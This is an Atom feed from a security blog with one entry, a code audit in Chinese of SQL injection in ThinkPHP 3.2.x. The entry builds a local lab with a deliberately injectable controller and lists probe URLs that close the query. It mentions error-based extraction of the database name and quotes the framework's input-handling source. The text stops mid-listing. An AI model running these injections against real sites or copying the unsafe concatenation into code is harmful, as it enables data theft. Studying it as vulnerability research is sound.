<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0nk3y‘s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-12-28T14:56:49.661Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ThinkPHP 3.2.x SQL注入漏洞代码审计</title>
    <link href="https://hack-for.fun/1209.html"/>
    <id>https://hack-for.fun/1209.html</id>
    <published>2020-12-28T13:14:02.000Z</published>
    <updated>2020-12-28T14:56:49.661Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>明天数据结构反正大概率是挂了，也看不进去书了。不如学点东西，把之前未完成的内容给完成了。</p></blockquote><p>[toc]</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>tp3.2.3目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">├── Application</span><br><span class="line">│   ├── Common</span><br><span class="line">│   │   ├── Common</span><br><span class="line">│   │   └── Conf</span><br><span class="line">│   ├── Home</span><br><span class="line">│   │   ├── Common</span><br><span class="line">│   │   ├── Conf</span><br><span class="line">│   │   ├── Controller</span><br><span class="line">│   │   ├── Model</span><br><span class="line">│   │   └── View</span><br><span class="line">│   └── Runtime</span><br><span class="line">│       ├── Cache</span><br><span class="line">│       │   └── Home</span><br><span class="line">│       ├── Data</span><br><span class="line">│       ├── Logs</span><br><span class="line">│       │   ├── Common</span><br><span class="line">│       │   └── Home</span><br><span class="line">│       └── Temp</span><br><span class="line">├── Public</span><br><span class="line">└── ThinkPHP</span><br><span class="line">    ├── Common</span><br><span class="line">    ├── Conf</span><br><span class="line">    ├── Lang</span><br><span class="line">    ├── Library</span><br><span class="line">    │   ├── Behavior</span><br><span class="line">    │   ├── Org</span><br><span class="line">    │   │   ├── Net</span><br><span class="line">    │   │   └── Util</span><br><span class="line">    │   ├── Think</span><br><span class="line">    │   │   ├── Cache</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Controller</span><br><span class="line">    │   │   ├── Crypt</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Db</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Image</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Log</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Model</span><br><span class="line">    │   │   ├── Session</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Storage</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Template</span><br><span class="line">    │   │   │   ├── Driver</span><br><span class="line">    │   │   │   └── TagLib</span><br><span class="line">    │   │   ├── Upload</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   │       ├── Bcs</span><br><span class="line">    │   │   │       └── Qiniu</span><br><span class="line">    │   │   └── Verify</span><br><span class="line">    │   │       ├── bgs</span><br><span class="line">    │   │       ├── ttfs</span><br><span class="line">    │   │       └── zhttfs</span><br><span class="line">    │   └── Vendor</span><br><span class="line">    │       ├── Boris</span><br><span class="line">    │       ├── EaseTemplate</span><br><span class="line">    │       ├── Hprose</span><br><span class="line">    │       ├── SmartTemplate</span><br><span class="line">    │       ├── Smarty</span><br><span class="line">    │       │   ├── plugins</span><br><span class="line">    │       │   └── sysplugins</span><br><span class="line">    │       ├── TemplateLite</span><br><span class="line">    │       │   └── internal</span><br><span class="line">    │       ├── jsonRPC</span><br><span class="line">    │       ├── phpRPC</span><br><span class="line">    │       │   ├── dhparams</span><br><span class="line">    │       │   └── pecl</span><br><span class="line">    │       │       └── xxtea</span><br><span class="line">    │       │           └── test</span><br><span class="line">    │       └── spyc</span><br><span class="line">    │           ├── examples</span><br><span class="line">    │           ├── php4</span><br><span class="line">    │           └── tests</span><br><span class="line">    ├── Mode</span><br><span class="line">    │   └── Sae</span><br><span class="line">    └── Tpl</span><br><span class="line"></span><br><span class="line">79 directories</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）</span><br><span class="line">│  ├─Common       核心公共函数目录</span><br><span class="line">│  ├─Conf         核心配置目录 </span><br><span class="line">│  ├─Lang         核心语言包目录</span><br><span class="line">│  ├─Library      框架类库目录</span><br><span class="line">│  │  ├─Think     核心Think类库包目录</span><br><span class="line">│  │  ├─Behavior  行为类库目录</span><br><span class="line">│  │  ├─Org       Org类库包目录</span><br><span class="line">│  │  ├─Vendor    第三方类库目录</span><br><span class="line">│  │  ├─ .      更多类库目录</span><br><span class="line">│  ├─Mode         框架应用模式目录</span><br><span class="line">│  ├─Tpl          系统模板目录</span><br><span class="line">│  ├─LICENSE.txt  框架授权协议文件</span><br><span class="line">│  ├─logo.png     框架LOGO文件</span><br><span class="line">│  ├─README.txt   框架README文件</span><br><span class="line">│  └─ThinkPHP.php 框架入口文件</span><br></pre></td></tr></table></figure><p>创建数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> tp3;</span><br><span class="line"><span class="keyword">use</span> tp3;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tp3_user(<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">8</span>) AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,username <span class="built_in">varchar</span>(<span class="number">255</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tp3_user <span class="keyword">value</span> (<span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br></pre></td></tr></table></figure><p>测试数据库连接是否成功</p><p>![image-20201228223007080](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201228223007080.png)</p><h1 id="Where注入"><a href="#Where注入" class="headerlink" title="Where注入"></a>Where注入</h1><p>where 注入测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $data = M(<span class="string">&#x27;tp3_user&#x27;</span>)-&gt;where(<span class="string">&#x27;id=1&#x27;</span>)-&gt;select();</span><br><span class="line">        dump($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $username = M(<span class="string">&quot;tp3_user&quot;</span>)-&gt;where(<span class="string">&#x27;id=&#x27;</span>.I(<span class="string">&#x27;id&#x27;</span>))-&gt;find();</span><br><span class="line">        dump($username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tp3:8890&#x2F;index.php&#x2F;home&#x2F;index&#x2F;username?id&#x3D;1&#39; 报错</span><br><span class="line">http:&#x2F;&#x2F;tp3:8890&#x2F;index.php&#x2F;home&#x2F;index&#x2F;username?id&#x3D;1) --   ,闭合成功查到数据</span><br></pre></td></tr></table></figure><p>报错注入查询数据库名</p><p>![image-20201228224535928](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201228224535928.png)</p><p>传入的id参数，首先进入<code>I</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取输入参数 支持过滤和默认值</span></span><br><span class="line"><span class="comment"> * 使用方法:</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;</span></span><br><span class="line"><span class="comment"> * I(&#x27;id&#x27;,0); 获取id参数 自动判断get或者post</span></span><br><span class="line"><span class="comment"> * I(&#x27;post.name&#x27;,&#x27;&#x27;,&#x27;htmlspecialchars&#x27;); 获取$_POST[&#x27;name&#x27;]</span></span><br><span class="line"><span class="comment"> * I(&#x27;get.&#x27;); 获取$_GET</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 变量的名称 支持指定类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $default 不存在的时候默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $filter 参数过滤方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $datas 要获取的额外数据源</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">I</span>(<span class="params">$name,$default=<span class="string">&#x27;&#x27;</span>,$filter=<span class="literal">null</span>,$datas=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line"><span class="built_in">static</span> $_PUT=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(strpos($name,<span class="string">&#x27;/&#x27;</span>))&#123; <span class="comment">// 指定修饰符</span></span><br><span class="line"><span class="keyword">list</span>($name,$type) =explode(<span class="string">&#x27;/&#x27;</span>,$name,<span class="number">2</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(C(<span class="string">&#x27;VAR_AUTO_STRING&#x27;</span>))&#123; <span class="comment">// 默认强制转换为字符串</span></span><br><span class="line">        $type   =   <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strpos($name,<span class="string">&#x27;.&#x27;</span>)) &#123; <span class="comment">// 指定参数来源</span></span><br><span class="line">        <span class="keyword">list</span>($method,$name) =   explode(<span class="string">&#x27;.&#x27;</span>,$name,<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 默认为自动判断</span></span><br><span class="line">        $method =   <span class="string">&#x27;param&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(strtolower($method)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>     :   </span><br><span class="line">        $input =&amp; $_GET;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;post&#x27;</span>    :   </span><br><span class="line">        $input =&amp; $_POST;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;put&#x27;</span>     :   </span><br><span class="line">        <span class="keyword">if</span>(is_null($_PUT))&#123;</span><br><span class="line">            parse_str(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), $_PUT);</span><br><span class="line">        &#125;</span><br><span class="line">        $input =$_PUT;        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;param&#x27;</span>   :</span><br><span class="line">            <span class="keyword">switch</span>($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    $input  =  $_POST;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span>(is_null($_PUT))&#123;</span><br><span class="line">                    parse_str(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), $_PUT);</span><br><span class="line">                &#125;</span><br><span class="line">                $input =$_PUT;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $input  =  $_GET;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;path&#x27;</span>    :   </span><br><span class="line">            $input  =   <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">&#x27;PATH_INFO&#x27;</span>]))&#123;</span><br><span class="line">                $depr   =   C(<span class="string">&#x27;URL_PATHINFO_DEPR&#x27;</span>);</span><br><span class="line">                $input  =   explode($depr,trim($_SERVER[<span class="string">&#x27;PATH_INFO&#x27;</span>],$depr));            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;request&#x27;</span> :   </span><br><span class="line">        $input =&amp; $_REQUEST;   </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;session&#x27;</span> :   </span><br><span class="line">        $input =&amp; $_SESSION;   </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;cookie&#x27;</span>  :   </span><br><span class="line">        $input =&amp; $_COOKIE;    </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;server&#x27;</span>  :   </span><br><span class="line">        $input =&amp; $_SERVER;    </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;globals&#x27;</span> :   </span><br><span class="line">        $input =&amp; $GLOBALS;    </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;data&#x27;</span>    :   </span><br><span class="line">        $input =&amp; $datas;      </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;&#x27;</span>==$name) &#123; <span class="comment">// 获取全部变量</span></span><br><span class="line">        $data       =   $input;</span><br><span class="line">        $filters    =   <span class="keyword">isset</span>($filter)?$filter:C(<span class="string">&#x27;DEFAULT_FILTER&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>($filters) &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string($filters))&#123;</span><br><span class="line">                $filters    =   explode(<span class="string">&#x27;,&#x27;</span>,$filters);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span>($filters <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">                $data   =   array_map_recursive($filter,$data); <span class="comment">// 参数过滤</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($input[$name])) &#123; <span class="comment">// 取值操作</span></span><br><span class="line">        $data       =   $input[$name];</span><br><span class="line">        $filters    =   <span class="keyword">isset</span>($filter)?$filter:C(<span class="string">&#x27;DEFAULT_FILTER&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>($filters) &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string($filters))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> === strpos($filters,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="number">1</span> !== preg_match($filters,(<span class="keyword">string</span>)$data))&#123;</span><br><span class="line">                        <span class="comment">// 支持正则验证</span></span><br><span class="line">                        <span class="keyword">return</span>   <span class="keyword">isset</span>($default) ? $default : <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $filters    =   explode(<span class="string">&#x27;,&#x27;</span>,$filters);                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(is_int($filters))&#123;</span><br><span class="line">                $filters    =   <span class="keyword">array</span>($filters);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array($filters))&#123;</span><br><span class="line">                <span class="keyword">foreach</span>($filters <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(function_exists($filter)) &#123;</span><br><span class="line">                        $data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); <span class="comment">// 参数过滤</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        $data   =   filter_var($data,is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                        <span class="keyword">if</span>(<span class="literal">false</span> === $data) &#123;</span><br><span class="line">                            <span class="keyword">return</span>   <span class="keyword">isset</span>($default) ? $default : <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($type))&#123;</span><br><span class="line">        <span class="keyword">switch</span>(strtolower($type))&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:<span class="comment">// 数组</span></span><br><span class="line">        $data =(<span class="keyword">array</span>)$data;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:<span class="comment">// 数字</span></span><br><span class="line">        $data =(<span class="keyword">int</span>)$data;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:<span class="comment">// 浮点</span></span><br><span class="line">        $data =(<span class="keyword">float</span>)$data;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:<span class="comment">// 布尔</span></span><br><span class="line">        $data =(<span class="keyword">boolean</span>)$data;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:   <span class="comment">// 字符串</span></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $data   =   (<span class="keyword">string</span>)$data;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 变量默认值</span></span><br><span class="line">        $data       =    <span class="keyword">isset</span>($default)?$default:<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    is_array($data) &amp;&amp; array_walk_recursive($data,<span class="string">&#x27;think_filter&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 